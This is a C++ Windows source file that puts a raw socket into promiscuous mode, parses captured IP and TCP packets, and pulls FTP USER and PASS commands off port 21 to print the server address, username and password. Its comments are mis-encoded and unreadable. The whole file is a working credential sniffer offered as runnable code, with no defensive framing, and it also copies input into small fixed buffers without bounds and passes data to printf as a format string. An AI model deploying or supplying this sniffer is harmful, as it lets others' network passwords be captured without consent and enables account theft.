#include "initsock.h"
#include "protoinfo.h"
#include<iostream>

#include <stdio.h>
#include <mstcpip.h>
using namespace std;

#pragma comment(lib, "Advapi32.lib")

CInitSock theSock;

void GetFtp(char *pData, DWORD dwDestIp)
{
	char szBuf[256];
	static char szUserName[21];
	static char szPassword[21];

	if(strnicmp(pData, "USER ", 5) == 0)
	{
		sscanf(pData + 4, "%*[ ]%s", szUserName);	
	}
	else if(strnicmp(pData, "PASS ", 5) == 0)
	{
		sscanf(pData + 4, "%*[ ]%s", szPassword);

		wsprintf(szBuf, " Server Address: %s; User Name: %s; Password: %s; \n\n", ::inet_ntoa(*(in_addr*)&dwDestIp), szUserName, szPassword);

		printf(szBuf);	// ���������Խ������浽�ļ���
	}
}

//����ṹ�嶨����protoinfo.h�� 
void DecodeIPPacket(char *pData)
{
	//��ȡipͷ�� 
	IPHeader *pIPHdr = (IPHeader*)pData;
	// iphVerLen�汾�ź�ͷ���ȣ���ռ4λ��
	int nHeaderLen = (pIPHdr->iphVerLen & 0xf) * sizeof(ULONG);
	//��ȱЭ������ 
	switch(pIPHdr->ipProtocol)
	{
		//����ipЭ�� 
	case IPPROTO_TCP:
		{
			
			TCPHeader *pTCPHdr = (TCPHeader *)(pData + nHeaderLen);
			switch(::ntohs(pTCPHdr->destinationPort))
			{
			case 21:	// ftpЭ��
				{
					cout<<"get info\n";
					GetFtp((char*)pTCPHdr + sizeof(TCPHeader), pIPHdr->ipDestination);
				}
				break;

			case 80:	// httpЭ��...
			case 8080:
				
				break;
			}
		}
		break;
	case IPPROTO_UDP:
		break;
	case IPPROTO_ICMP:
		break; 
	}
}


int main()
{
	// ����ԭʼ�׽���
	SOCKET sRaw = socket(AF_INET, SOCK_RAW, IPPROTO_IP);

	// ��ȡ����IP��ַ
	char szHostName[56];
	SOCKADDR_IN addr_in;
	struct  hostent *pHost;
	gethostname(szHostName, 56);
	pHost = gethostbyname((char*)szHostName);
	if( pHost== NULL)	
		return -1;
	else{
		cout<<"����ipΪ\n";
		int i=0;
		struct in_addr addr; 
		while(pHost->h_addr_list[i]!=0){
			
			cout<<"ipΪ��"<<i<<"# "<<*(u_long*) pHost->h_addr_list[i++];
			
		}
	}
		
		 
	// �ڵ���ioctl֮ǰ���׽��ֱ����
	addr_in.sin_family  = AF_INET;
	addr_in.sin_port    = htons(0);
	//�ѿ���ip�б���ip����Ϊ��ip
	cout<<"\n��ѡ��ʹ�õı���ip\n";
	int ip_i;
	cin>>ip_i; 
	memcpy(&addr_in.sin_addr.S_un.S_addr, pHost->h_addr_list[ip_i], pHost->h_length);
	
	printf(" Binding to interface : %s \n", ::inet_ntoa(addr_in.sin_addr));
	if(bind(sRaw, (PSOCKADDR)&addr_in, sizeof(addr_in)) == SOCKET_ERROR){
		cout<<"�󶨶˿ڴ���"<<endl;
		return -1;
	}
		

	// ����SIO_RCVALL���ƴ��룬�Ա�������е�IP��	
	DWORD dwValue = 1;
	if(ioctlsocket(sRaw, SIO_RCVALL, &dwValue) != 0)	
		return -1;
	
	// ��ʼ���շ��
	printf(" \n\n begin to monitor ftp password... \n\n");
	char buff[1024];
	int nRet;
	while(true)
	{
		nRet = recv(sRaw, buff, 1024, 0);
		if(nRet > 0)
		{
			//printf("ready\n"); 
			//cout<<buff;
			DecodeIPPacket(buff);
		}
	}
	closesocket(sRaw);
}

